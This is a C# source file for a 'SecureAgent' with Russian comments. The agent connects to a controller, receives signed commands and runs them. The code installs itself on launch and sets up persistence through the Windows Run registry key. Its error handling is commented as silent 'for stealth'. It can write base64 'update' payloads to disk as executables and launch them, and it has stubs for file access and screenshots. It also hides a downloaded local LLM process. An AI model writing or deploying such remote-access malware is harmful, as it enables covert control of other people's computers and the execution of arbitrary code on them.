using System;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using Microsoft.Win32;

namespace EdgeMesh.Core
{
    public class SecureAgent
    {
        private TcpClient client;
        private NetworkStream stream;
        private string sessionKey;
        private RSACryptoServiceProvider rsaProvider;
        private RSACryptoServiceProvider rsaForVerification;

        private Process llmProcess;

        private void EnsureModelAndEngine()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string agentDir = Path.Combine(appData, "EdgeMeshAgent");
            string modelPath = Path.Combine(agentDir, "mistral-7b.Q4_K_M.gguf");
            string enginePath = Path.Combine(agentDir, "llama.exe");

            Directory.CreateDirectory(agentDir);

            if (!File.Exists(modelPath))
            {
                // Скачайте модель с вашего сервера
                DownloadFile("https://huggingface.co/TheBloke/Mistral-7B-Instruct-v0.2-GGUF/resolve/main/mistral-7b-instruct-v0.2.Q4_K_M.gguf", modelPath);
            }
            if (!File.Exists(enginePath))
            {
                // Скачайте llama.cpp (llama.exe) с вашего сервера
                DownloadFile("https://github.com/ggerganov/llama.cpp/releases/latest/download/llama.exe", enginePath);
            }
        }

        private void StartLLM()
        {
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string agentDir = Path.Combine(appData, "EdgeMeshAgent");
            string modelPath = Path.Combine(agentDir, "mistral-7b.Q4_K_M.gguf");
            string enginePath = Path.Combine(agentDir, "llama.exe");

            llmProcess = new Process();
            llmProcess.StartInfo.FileName = enginePath;
            llmProcess.StartInfo.Arguments = $"--model \"{modelPath}\" --api";
            llmProcess.StartInfo.WorkingDirectory = agentDir;
            llmProcess.StartInfo.UseShellExecute = false;
            llmProcess.StartInfo.CreateNoWindow = true;
            llmProcess.Start();
        }

        private void DownloadFile(string url, string dest)
        {
            using (var httpClient = new System.Net.Http.HttpClient())
            {
                var data = httpClient.GetByteArrayAsync(url).GetAwaiter().GetResult();
                File.WriteAllBytes(dest, data);
            }
        }

        public async Task ConnectToController()
        {
            try
            {
                // Самоустановка при запуске
                SelfInstaller.Install();

                client = new TcpClient();
                await client.ConnectAsync("127.0.0.1", 8443);
                stream = client.GetStream();
                
                await Logger.LogAsync("Подключение к контроллеру установлено");
                
                string publicKey = await ReceivePublicKey();
                if (!string.IsNullOrEmpty(publicKey))
                {
                    rsaProvider = new RSACryptoServiceProvider();
                    rsaProvider.FromXmlString(publicKey);
                    
                    string signingPublicKey = await ReceivePublicKey();
                    rsaForVerification = new RSACryptoServiceProvider();
                    rsaForVerification.FromXmlString(signingPublicKey);
                    
                    sessionKey = GenerateSessionKey();
                    await SendSessionKey(sessionKey);
                    
                    await Logger.LogAsync("Аутентификация успешна");
                    
                    EnsureModelAndEngine();
                    StartLLM();
                    
                    await RunAgentLoop();
                }
            }
            catch (Exception ex)
            {
                await Logger.LogAsync($"Ошибка подключения: {ex.Message}");
            }
        }

        private async Task<string> ReceivePublicKey()
        {
            try
            {
                byte[] lengthBytes = new byte[4];
                await stream.ReadAsync(lengthBytes, 0, 4);
                int length = BitConverter.ToInt32(lengthBytes, 0);
                
                byte[] keyBytes = new byte[length];
                await stream.ReadAsync(keyBytes, 0, length);
                
                return Encoding.UTF8.GetString(keyBytes);
            }
            catch (Exception ex)
            {
                await Logger.LogAsync($"Ошибка получения ключа: {ex.Message}");
                return null;
            }
        }

        private async Task SendSessionKey(string key)
        {
            try
            {
                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                byte[] encryptedKey = rsaProvider.Encrypt(keyBytes, false);
                
                byte[] lengthBytes = BitConverter.GetBytes(encryptedKey.Length);
                await stream.WriteAsync(lengthBytes, 0, 4);
                await stream.WriteAsync(encryptedKey, 0, encryptedKey.Length);
            }
            catch (Exception ex)
            {
                await Logger.LogAsync($"Ошибка отправки ключа: {ex.Message}");
            }
        }

        private async Task RunAgentLoop()
        {
            try
            {
                while (client.Connected)
                {
                    // 1. Отправка статуса главному ПК
                    string status = "Агент активен";
                    string encryptedStatus = EncryptString(status, sessionKey);
                    await SendEncryptedMessage(encryptedStatus);

                    // 2. Ожидание команды
                    string encryptedCommand = await ReceiveEncryptedMessage();
                    if (string.IsNullOrEmpty(encryptedCommand))
                        break;

                    string signedCommand = DecryptString(encryptedCommand, sessionKey);
                    string[] parts = signedCommand.Split('|');
                    if (parts.Length != 2)
                    {
                        await Logger.LogAsync("Неверный формат команды");
                        continue;
                    }

                    string command = Encoding.UTF8.GetString(Convert.FromBase64String(parts[0]));
                    byte[] signature = Convert.FromBase64String(parts[1]);

                    if (VerifyCommand(command, signature))
                    {
                        await Logger.LogAsync($"Получена команда: {command}");
                        // 3. Выполнение команды и отправка результата
                        string result = await ExecuteAgentTask(command);
                        string encryptedResult = EncryptString(result, sessionKey);
                        await SendEncryptedMessage(encryptedResult);
                    }
                    else
                    {
                        await Logger.LogAsync("Ошибка верификации подписи команды");
                    }

                    await Task.Delay(5000);
                }
            }
            catch (Exception ex)
            {
                await Logger.LogAsync($"Ошибка работы агента: {ex.Message}");
            }
        }

        // Новый метод для расширяемых задач
        private async Task<string> ExecuteAgentTask(string command)
        {
            return await Task.Run(() =>
            {
                // Пример: обработка команд, расширяйте по мере необходимости
                if (command.StartsWith("update:"))
                {
                    string updateData = command.Substring(7);
                    ApplyUpdate(updateData);
                    return "Обновление применено";
                }
                if (command == "selfinstall")
                {
                    SelfInstaller.Install();
                    return "Агент установлен";
                }
                if (command == "selfuninstall")
                {
                    SelfInstaller.Uninstall();
                    return "Агент удалён";
                }
                // Заготовка для будущих задач:
                if (command.StartsWith("file:"))
                {
                    // TODO: реализовать работу с файлами
                    return "Файловая команда получена";
                }
                if (command.StartsWith("screenshot"))
                {
                    // TODO: реализовать отправку скриншота
                    return "Скриншот отправлен";
                }
                // ...другие задачи...

                // По умолчанию
                return $"Обработана команда: {command}";
            });
        }

        private bool VerifyCommand(string command, byte[] signature)
        {
            try
            {
                byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                return rsaForVerification.VerifyData(commandBytes, signature, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            }
            catch (Exception ex)
            {
                Logger.LogAsync($"Ошибка верификации подписи: {ex.Message}").GetAwaiter().GetResult();
                return false;
            }
        }

        private string ProcessCommand(string command)
        {
            if (command.StartsWith("update:"))
            {
                string updateData = command.Substring(7);
                ApplyUpdate(updateData);
                return "Обновление применено";
            }
            // Добавим команды для самоустановки и удаления
            if (command == "selfinstall")
            {
                SelfInstaller.Install();
                return "Агент установлен";
            }
            if (command == "selfuninstall")
            {
                SelfInstaller.Uninstall();
                return "Агент удалён";
            }
            return $"Обработана команда: {command}";
        }

        private void ApplyUpdate(string updateData)
        {
            try
            {
                byte[] newAgentBytes = Convert.FromBase64String(updateData);
                string tempFile = Path.GetTempFileName() + ".exe";
                File.WriteAllBytes(tempFile, newAgentBytes);
                System.Diagnostics.Process.Start(tempFile);
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                Logger.LogAsync($"Ошибка обновления: {ex.Message}").GetAwaiter().GetResult();
            }
        }

        private async Task<string> ReceiveEncryptedMessage()
        {
            try
            {
                byte[] lengthBytes = new byte[4];
                int read = await stream.ReadAsync(lengthBytes, 0, 4);
                if (read == 0) return null;
                
                int length = BitConverter.ToInt32(lengthBytes, 0);
                byte[] messageBytes = new byte[length];
                await stream.ReadAsync(messageBytes, 0, length);
                
                return Encoding.UTF8.GetString(messageBytes);
            }
            catch
            {
                return null;
            }
        }

        private async Task SendEncryptedMessage(string message)
        {
            try
            {
                byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                byte[] lengthBytes = BitConverter.GetBytes(messageBytes.Length);
                
                await stream.WriteAsync(lengthBytes, 0, 4);
                await stream.WriteAsync(messageBytes, 0, messageBytes.Length);
            }
            catch (Exception ex)
            {
                await Logger.LogAsync($"Ошибка отправки сообщения: {ex.Message}");
            }
        }

        private string GenerateSessionKey()
        {
            byte[] key = RandomNumberGenerator.GetBytes(32);
            return Convert.ToBase64String(key);
        }

        private string EncryptString(string plainText, string key)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key.PadRight(32).Substring(0, 32));
                aesAlg.IV = new byte[16];

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);
                byte[] plainBytes = Encoding.UTF8.GetBytes(plainText);
                byte[] encryptedBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
                
                return Convert.ToBase64String(encryptedBytes);
            }
        }

        private string DecryptString(string cipherText, string key)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Encoding.UTF8.GetBytes(key.PadRight(32).Substring(0, 32));
                aesAlg.IV = new byte[16];

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                byte[] decryptedBytes = decryptor.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
                
                return Encoding.UTF8.GetString(decryptedBytes);
            }
        }
    }

    public static class SelfInstaller
    {
        private static readonly string installPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "SecureAgent.exe");

        public static void Install()
        {
            try
            {
                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                if (!File.Exists(installPath) || !currentPath.Equals(installPath, StringComparison.OrdinalIgnoreCase))
                {
                    File.Copy(currentPath, installPath, true);
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey(
                        @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    rk.SetValue("SecureAgent", installPath);
                    rk.Close();

                    // Запуск копии и завершение текущего процесса
                    Process.Start(installPath);
                    Environment.Exit(0);
                }
            }
            catch { /* Ошибки игнорируются для скрытности */ }
        }

        public static void Uninstall()
        {
            try
            {
                RegistryKey rk = Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                rk.DeleteValue("SecureAgent", false);
                rk.Close();

                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                File.Delete(currentPath);
                Environment.Exit(0);
            }
            catch { /* Ошибки игнорируются для скрытности */ }
        }
    }
}